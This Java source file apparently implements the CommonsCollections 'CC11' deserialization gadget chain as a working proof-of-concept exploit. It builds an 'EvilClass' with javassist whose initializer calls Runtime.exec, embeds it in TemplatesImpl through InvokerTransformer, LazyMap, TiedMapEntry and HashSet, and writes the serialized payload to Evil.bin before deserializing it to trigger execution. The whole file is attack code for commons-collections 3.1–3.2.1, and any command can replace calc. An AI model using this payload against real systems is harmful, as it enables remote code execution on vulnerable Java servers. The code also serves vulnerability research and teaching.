package com.CommonsCollections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;


/**
 * Gadget chain:
 * java.io.ObjectInputStream.readObject()
 *        java.util.HashSet.readObject()
 *            java.util.HashMap.put()
 *            java.util.HashMap.hash()
 *                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
 *                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 *                    org.apache.commons.collections.map.LazyMap.get()
 *                        org.apache.commons.collections.functors.InvokerTransformer.transform()
 *                        java.lang.reflect.Method.invoke()
 *                            ... templates gadgets ...
 *                                java.lang.Runtime.exec()
 *
 * 	Requires:
 * 		commons-collections:3.1-3.2.1
 * 	    JDK: 1.7 & 1.8
 *
 * 	Refer：
 * 	https://www.yuque.com/tianxiadamutou/zcfd4v/th41wx
 */


public class CC11 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass("EvilClass");
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] classBytes = payload.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name","name");
        setFieldValue(templates,"_bytecodes",new byte[][]{classBytes});

        InvokerTransformer transformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
        HashMap<String, String> innermap = new HashMap<>();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        HashMap hashset_map;
        try {
            hashset_map = (HashMap) getFieldValue(hashset, "map");
        } catch (NoSuchFieldException e) {
            hashset_map = (HashMap) getFieldValue(hashset, "backingMap");
        }

        Object[] array;
        try {
            array = (Object[]) getFieldValue(hashset_map, "table");
        } catch (NoSuchFieldException e) {
            array = (Object[]) getFieldValue(hashset_map, "elementData");
        }

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedmap);
        setFieldValue(transformer, "iMethodName", "newTransformer");

        //payload序列化写入文件
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(hashset);
        outputStream.close();
        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();
    }

    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    public static Object getFieldValue(Object object, String fieldName) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(object);
    }
}

